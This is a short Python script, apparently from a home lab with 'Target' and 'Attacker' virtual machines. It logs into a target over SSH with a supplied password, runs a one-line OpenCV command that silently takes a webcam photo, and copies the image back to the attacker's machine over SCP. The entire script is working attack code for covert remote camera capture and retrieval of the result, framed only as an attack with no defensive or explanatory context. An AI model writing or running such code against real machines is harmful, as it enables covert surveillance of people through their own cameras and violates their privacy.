import getpass # This hides the password as you type it
import paramiko
import scp

TARGET_IP = "192.168.209.129"
USERNAME = "e1-target"


password = getpass.getpass(f"Enter password for {USERNAME}@{TARGET_IP}: ")

def remote_capture():
    try:
        # 1. Connect to the Target VM
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(TARGET_IP, username=USERNAME, password=password)
        
        print(f"Connected to {TARGET_IP}")

        # 2. Command the target to take a photo
        # This assumes the target has python and opencv installed
        capture_command = (
            "python3 -c 'import cv2; cam = cv2.VideoCapture(0); "
            "s, img = cam.read(); cv2.imwrite(\"remote_snap.jpg\", img); cam.release()'"
        )
        
        print("Executing remote capture...")
        ssh.exec_command(capture_command)

        # 3. Download the photo back to the Attacker VM
        with scp.SCPClient(ssh.get_transport()) as scp_client:
            scp_client.get("remote_snap.jpg", "captured_from_target.jpg")
        
        print("Success! Photo saved as captured_from_target.jpg")
        ssh.close()

    except Exception as e:
        print(f"Attack failed: {e}")

if __name__ == "__main__":
    remote_capture()